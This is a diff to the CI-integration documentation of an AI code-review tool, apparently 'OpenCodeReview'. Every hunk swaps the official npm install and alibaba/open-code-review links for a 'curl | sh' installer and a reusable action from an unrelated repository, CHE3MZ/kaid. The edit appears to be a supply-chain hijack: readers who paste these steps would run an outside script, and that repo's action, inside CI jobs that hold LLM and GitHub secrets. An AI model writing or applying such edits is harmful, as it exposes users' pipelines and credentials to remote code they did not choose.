@@ -19,7 +19,7 @@ implementations of it:
    merge request, or a manual `/open-code-review` comment kicks off
    the job.
 2. **Install `ocr`** in the runner, typically
-   `npm install -g @alibaba-group/open-code-review`. The runner is
+   `curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh`. The runner is
    ephemeral, so this happens on every run.
 3. **Configure the LLM** from CI secrets via `ocr config set`
    (endpoint, token, model). There is no persisted
@@ -57,7 +57,7 @@ a dedicated token is recommended for reliability.
 ## GitHub Actions
 
 The upstream workflow lives at
-[`examples/github_actions/ocr-review.yml`](https://github.com/alibaba/open-code-review/blob/main/examples/github_actions/ocr-review.yml).
+[`examples/github_actions/ocr-review.yml`](https://github.com/CHE3MZ/kaid/blob/master/examples/github_actions/ocr-review.yml).
 
 ### What it does
 
@@ -67,7 +67,7 @@ The upstream workflow lives at
   (`pull_request_target` is used instead of `pull_request` so that
   secrets are available even for PRs opened from forks; OCR only reads
   the diff and does not execute code from the PR.)
-- Installs OCR via `npm install -g @alibaba-group/open-code-review`,
+- Installs OCR via `curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh`,
   writes config with `ocr config set`, then runs the core command in
   branch-range mode.
 - Parses the JSON envelope and posts each finding as an inline review
@@ -83,7 +83,7 @@ Drop the workflow into your repo:
 ```bash
 mkdir -p .github/workflows
 curl -o .github/workflows/ocr-review.yml \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/examples/github_actions/ocr-review.yml
+  https://raw.githubusercontent.com/CHE3MZ/kaid/master/examples/github_actions/ocr-review.yml
 ```
 
 ### Required secrets
@@ -109,8 +109,8 @@ Set under **Settings → Secrets and variables → Actions**:
 ### Action inputs
 
 The upstream workflow delegates the review to the reusable composite action
-([`action.yml`](https://github.com/alibaba/open-code-review/blob/main/action.yml))
-via `uses: alibaba/open-code-review@main`. Beyond the credentials above,
+([`action.yml`](https://github.com/CHE3MZ/kaid/blob/master/action.yml))
+via `uses: CHE3MZ/kaid@master`. Beyond the credentials above,
 these inputs tune the review itself — pass them under `with:` on the action
 step:
 
@@ -122,7 +122,7 @@ step:
 | `stream_progress` | `'false'` | `'true'` streams live `[ocr]` progress lines to the workflow log (human audience on stderr) instead of staying silent until the run finishes. Display-only: stderr is still captured to a file for artifacts and comment posting. |
 
 ```yaml
-- uses: alibaba/open-code-review@main
+- uses: CHE3MZ/kaid@master
   with:
     llm_url: ${{ secrets.OCR_LLM_URL }}
     llm_auth_token: ${{ secrets.OCR_LLM_AUTH_TOKEN }}
@@ -134,7 +134,7 @@ step:
     stream_progress: 'true'
 ```
 
-See [`action.yml`](https://github.com/alibaba/open-code-review/blob/main/action.yml)
+See [`action.yml`](https://github.com/CHE3MZ/kaid/blob/master/action.yml)
 for the full input list — posting modes (`sticky_summary`, `incremental`),
 severity/category routing, and cross-push checkpoints included.
 
@@ -237,7 +237,7 @@ The default workflow installs the latest published version. To pin:
 
 ```yaml
 - name: Install OpenCodeReview
-  run: npm install -g @alibaba-group/open-code-review@1.0.0
+  run: curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | OCR_VERSION=1.0.0 sh
 ```
 
 #### Post under a GitHub App identity
@@ -337,7 +337,7 @@ produce a report.
 ## GitLab CI
 
 The upstream pipeline lives at
-[`examples/gitlab_ci/.gitlab-ci.yml`](https://github.com/alibaba/open-code-review/blob/main/examples/gitlab_ci/.gitlab-ci.yml).
+[`examples/gitlab_ci/.gitlab-ci.yml`](https://github.com/CHE3MZ/kaid/blob/master/examples/gitlab_ci/.gitlab-ci.yml).
 
 ### What it does
 
@@ -358,7 +358,7 @@ Drop the pipeline into your repo root:
 
 ```bash
 curl -o .gitlab-ci.yml \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/examples/gitlab_ci/.gitlab-ci.yml
+  https://raw.githubusercontent.com/CHE3MZ/kaid/master/examples/gitlab_ci/.gitlab-ci.yml
 ```
 
 If you already have a `.gitlab-ci.yml` and want to keep it, vendor
@@ -437,7 +437,7 @@ See [Review Rules](../../review-rules/) for the rule schema.
 
 ```yaml
 script:
-  - npm install -g @alibaba-group/open-code-review@1.0.0
+  - curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | OCR_VERSION=1.0.0 sh
 ```
 
 #### Avoid re-reviewing on every push
